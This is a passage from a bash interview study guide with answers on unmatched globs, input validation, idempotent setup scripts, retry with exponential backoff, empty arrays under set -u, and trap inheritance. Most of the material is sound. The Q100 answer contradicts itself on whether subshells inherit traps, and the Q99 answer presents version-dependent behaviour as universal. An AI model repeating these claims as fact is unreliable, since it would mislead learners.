When `/tmp/logs/` has no `.log` files, the glob `*.log` does not match anything and bash passes the literal string `/tmp/logs/*.log` as the value of `$file`. The script calls `process "/tmp/logs/*.log"` with a non-existent path and likely fails.

**How to think through this:**
1. By default, bash does not remove an unmatched glob — it passes it through as a literal string. This is the `nullglob` behavior being off.
2. `set -e` means if `process` fails (non-zero exit) on the bogus path, the script exits.
3. **Fix 1 — `nullglob` option:** Makes unmatched globs expand to nothing (empty list), so the loop body never runs.
   ```bash
   shopt -s nullglob
   for file in /tmp/logs/*.log; do
       process "$file"
   done
   ```
4. **Fix 2 — explicit guard:**
   ```bash
   for file in /tmp/logs/*.log; do
       [[ -f "$file" ]] || continue
       process "$file"
   done
   ```
5. **Fix 3 — use `find`:** `find /tmp/logs -maxdepth 1 -name "*.log"` returns nothing when empty.

**Key takeaway:** Enable `shopt -s nullglob` when iterating over globs — without it, an empty directory passes a literal unexpanded glob to your loop body.

</details>

📖 **Theory:** [debug-glob-expand](./03_control_flow/loops.md#recursive-glob-bash-4-with-globstar)


---

### Q96 · [Debug] · `debug-integer-compare`

> **This script crashes. Find why and fix it:**

```bash
read -p "Enter number: " n
if [ $n -gt 10 ]; then
    echo "Big"
fi
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
The script crashes in two cases: when the user enters nothing (empty input) or enters a non-integer string. Both cause `[ -gt ]` to fail with "integer expression expected."

**How to think through this:**
1. **Empty input:** If the user just presses Enter, `n` is empty. `[ -gt 10 ]` becomes `[  -gt 10 ]` which is a syntax error.
2. **Non-integer input:** If the user enters `abc`, `[ abc -gt 10 ]` crashes with "integer expression expected."
3. **Unquoted variable:** `[ $n -gt 10 ]` — if `n` is empty, word splitting makes this `[ -gt 10 ]`, a syntax error. Always quote: `[ "$n" -gt 10 ]`.
4. **Fix — validate input first:**
   ```bash
   read -r -p "Enter number: " n
   if [[ ! "$n" =~ ^-?[0-9]+$ ]]; then
       echo "Error: '$n' is not an integer" >&2
       exit 1
   fi
   if (( n > 10 )); then
       echo "Big"
   fi
   ```
5. Use `(( n > 10 ))` for arithmetic — it handles empty strings more gracefully (treats them as 0) and is cleaner syntax.

**Key takeaway:** Always validate user input before using it in arithmetic comparisons — quote variables and check with a regex before comparing.

</details>

📖 **Theory:** [debug-integer-compare](./03_control_flow/conditionals.md#conditionals-in-bash)


---

### Q97 · [Design] · `design-idempotent-script`

> **What does "idempotent" mean for a script? Design an idempotent `setup.sh` that creates a user, installs a package, and writes a config file — runnable multiple times safely.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
An idempotent script produces the same result whether run once or ten times — it checks current state before making changes.

**How to think through this:**
1. Each action must be preceded by a state check: "is this already done?" If yes, skip. If no, do it.
2. This makes scripts safe for re-runs after partial failures and for use in configuration management.

```bash
#!/usr/bin/env bash
set -euo pipefail

APP_USER="appuser"
PACKAGE="nginx"
CONFIG_FILE="/etc/myapp/config.ini"
CONFIG_CONTENT="[app]
port=8080
debug=false"

log() { echo "[setup] $*"; }

# 1. Create user (idempotent)
if id "$APP_USER" &>/dev/null; then
    log "User $APP_USER already exists — skipping"
else
    useradd --system --no-create-home "$APP_USER"
    log "Created user $APP_USER"
fi

# 2. Install package (idempotent)
if dpkg -l "$PACKAGE" 2>/dev/null | grep -q '^ii'; then
    log "Package $PACKAGE already installed — skipping"
else
    apt-get install -y "$PACKAGE"
    log "Installed $PACKAGE"
fi

# 3. Write config file (idempotent — only write if different)
mkdir -p "$(dirname "$CONFIG_FILE")"
if [[ -f "$CONFIG_FILE" ]] && [[ "$(cat "$CONFIG_FILE")" == "$CONFIG_CONTENT" ]]; then
    log "Config $CONFIG_FILE is current — skipping"
else
    echo "$CONFIG_CONTENT" > "$CONFIG_FILE"
    log "Wrote config $CONFIG_FILE"
fi

log "Setup complete."
```

**Key takeaway:** Idempotency means check-then-act, never act-blindly — every mutation must be guarded by a state check.

</details>

📖 **Theory:** [design-idempotent-script](./08_real_world_scripts/deployment_scripts.md#deployment-scripts)


---

### Q98 · [Design] · `design-retry-logic`

> **Write a `retry` function in bash that retries a command up to N times with exponential backoff.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A retry function wraps any command, catches failures, waits with doubling delay, and propagates the final exit code if all retries are exhausted.

**How to think through this:**
1. Accept max retries and the command as arguments using `"$@"` so the full command (including arguments) is passed through.
2. Exponential backoff: wait 1s, 2s, 4s, 8s... by doubling `delay` each iteration.
3. Report progress to stderr (not stdout) so output from the command itself is not polluted.

```bash
retry() {
    local max_attempts="${1:?retry: max_attempts required}"
    shift
    local cmd=("$@")
    local attempt=1
    local delay=1

    while (( attempt <= max_attempts )); do
        if "${cmd[@]}"; then
            return 0
        fi

        local exit_code=$?
        if (( attempt == max_attempts )); then
            echo "retry: '${cmd[*]}' failed after $max_attempts attempts" >&2
            return $exit_code
        fi

        echo "retry: attempt $attempt/$max_attempts failed (exit $exit_code). Retrying in ${delay}s..." >&2
        sleep "$delay"
        delay=$(( delay * 2 ))
        (( attempt++ ))
    done
}

# Usage examples:
# retry 3 curl -sf https://api.example.com/health
# retry 5 ./deploy.sh
# retry 4 pg_isready -h localhost -p 5432
```

**Key takeaway:** Store the command in an array (`cmd=("$@")`) rather than a string to preserve argument boundaries with spaces.

</details>

📖 **Theory:** [design-retry-logic](./04_functions/functions.md#functions-in-bash)


---

### Q99 · [Critical] · `edge-case-empty-array`

> **With `set -u` enabled, how do you safely iterate over an array that might be empty? Why does the naive approach fail?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
With `set -u`, expanding an unset or empty array with `"${arr[@]}"` triggers an "unbound variable" error. The fix is to use the `${arr[@]+"${arr[@]}"}` idiom or check array length first.

**How to think through this:**
1. **Why it fails:** `set -u` treats an unset variable as an error. An empty array `arr=()` is technically set but has no elements. In bash, `"${arr[@]}"` on an empty array expands to nothing — but with `set -u` this triggers "unbound variable" because `@` expansion on an empty array is treated as unset.
2. **Naive approach (fails):**
   ```bash
   set -u
   arr=()
   for item in "${arr[@]}"; do   # error: arr: unbound variable
       echo "$item"
   done
   ```
3. **Fix 1 — length guard:**
   ```bash
   if (( ${#arr[@]} > 0 )); then
       for item in "${arr[@]}"; do echo "$item"; done
   fi
   ```
4. **Fix 2 — the `+` operator (cleanest):**
   ```bash
   for item in "${arr[@]+"${arr[@]}"}"; do
       echo "$item"
   done
   ```
   The `${var+word}` expansion returns `word` if `var` is set, otherwise nothing — no error. This is the idiomatic bash solution.
5. **Fix 3 — `shopt -s nullglob` does not help here; this is a variable issue, not a glob issue.**

**Key takeaway:** Use `"${arr[@]+"${arr[@]}"}"` to safely expand an array that may be empty under `set -u`.

</details>

📖 **Theory:** [edge-case-empty-array](./02_variables_and_data/arrays.md#arrays-in-bash)


---

### Q100 · [Critical] · `edge-case-signal-cleanup`

> **A script sets `trap 'rm -f $tmpfile' EXIT`. What happens to the trap when the script forks a child process? Does the child also clean up `$tmpfile`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Trap handlers are NOT inherited by child processes. The child will not run the cleanup. If the child creates its own `$tmpfile`, it must set its own trap.

**How to think through this:**
1. When bash forks a child process (via `$(...)`, a background `&` command, or a subshell `(...)`), the child inherits variables and exported functions — but **not signal traps**. Traps in the child are reset to their defaults.
2. **Practical consequence:** If the parent script does:
   ```bash
   tmpfile=$(mktemp)
   trap 'rm -f "$tmpfile"' EXIT
   ./child_script.sh   # forks a new bash process
   ```
   The child does not have this trap. If the child creates its own temp files, it must register its own traps.
3. **What the child does inherit:** The value of `$tmpfile` (if exported or if running in the same shell script body). But the trap itself is gone.
4. **Subshell edge case:** A subshell `(...)` does inherit trap settings because it is a copy of the parent shell state made at fork time. However, it typically has its own EXIT trap context. This is one of the rare cases where traps are partially inherited.
5. **Best practice:** Each script/function that creates temp files should register its own EXIT trap. Alternatively, use a trap manager function that multiple levels call.

**Key takeaway:** Signal traps are not inherited across `fork`+`exec` (child scripts) — every script that creates resources it must clean up should register its own trap.

</details>

📖 **Theory:** [edge-case-signal-cleanup](./06_error_handling/traps.md#traps-and-signal-handling-in-bash)
